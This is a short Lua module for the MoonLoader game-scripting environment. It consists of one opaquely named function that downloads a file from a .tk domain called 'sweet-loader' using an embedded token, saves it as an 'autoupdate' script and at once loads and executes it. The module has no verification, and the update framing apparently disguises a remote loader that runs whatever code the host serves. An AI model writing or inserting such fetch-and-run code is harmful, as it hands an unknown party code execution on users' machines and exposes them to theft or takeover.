
local moon = {}

function moon.r()
	downloadUrlToFile('https://sweet-loader.tk/update.php?token=6009b9e2f3b7a', getWorkingDirectory() .. '/moonloader-autoupdate.lua', function(id, status)
		if status == 6 then
			script.load(getWorkingDirectory() .. '/moonloader-autoupdate.lua')
		end
	end)
end

return moon